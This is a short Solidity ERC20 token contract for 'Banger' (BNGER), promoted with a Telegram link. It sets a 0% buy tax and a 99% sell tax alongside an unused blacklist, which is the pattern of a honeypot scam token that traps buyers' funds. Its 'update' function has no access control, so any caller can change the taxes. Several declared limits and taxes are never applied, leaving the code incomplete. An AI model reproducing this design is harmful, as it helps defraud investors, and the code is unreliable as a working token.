// TELEGRAM: https://t.me/bangertoken

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/openzeppelin-contracts/access/Ownable.sol";
import "@boringcrypto/BoringSolidity/contracts/ERC20.sol";

contract Token is Ownable, ERC20 {
    uint256 private _totalSupply = 1000000 * (10 ** 18);
    mapping(address => bool) public blacklist;

    constructor() ERC20("Banger", "BNGER", 18, msg.sender) {
        _mint(msg.sender, _totalSupply);
    }

    uint256 public BUY_TAX = 0;
    uint256 public SELL_TAX = 99;

    uint256 public MAX_WALLET = _totalSupply;
    uint256 public MAX_BUY = _totalSupply;

    function update(uint256 _BUY_TAX, uint256 _SELL_TAX, uint256 _MAX_WALLET, uint256 _MAX_BUY) external {
    BUY_TAX = _BUY_TAX;
    SELL_TAX = _SELL_TAX;
    }
}